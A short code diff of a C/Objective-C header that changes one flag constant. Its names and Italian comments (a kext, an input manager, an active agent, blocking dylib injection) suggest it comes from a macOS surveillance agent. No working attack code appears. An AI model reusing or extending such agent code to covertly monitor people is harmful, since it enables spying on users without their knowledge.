@@ -758,7 +758,7 @@ extern NSString *gConfigurationUpdateName;
 extern NSString *gInputManagerName;
 extern NSString *gKextName;
 
-#define CRISIS_STARTSTOP    (UInt32)0x1
+#define CRISIS_STARTSTOP    (UInt32)0x2
 #define CRISIS_STOP         (UInt32)0x0  // Per retrocompatibilita'
 #define CRISIS_START        (UInt32)0x2  // Agent attivo
 #define CRISIS_HOOK         (UInt32)0x08 // Inibisce injection dylib
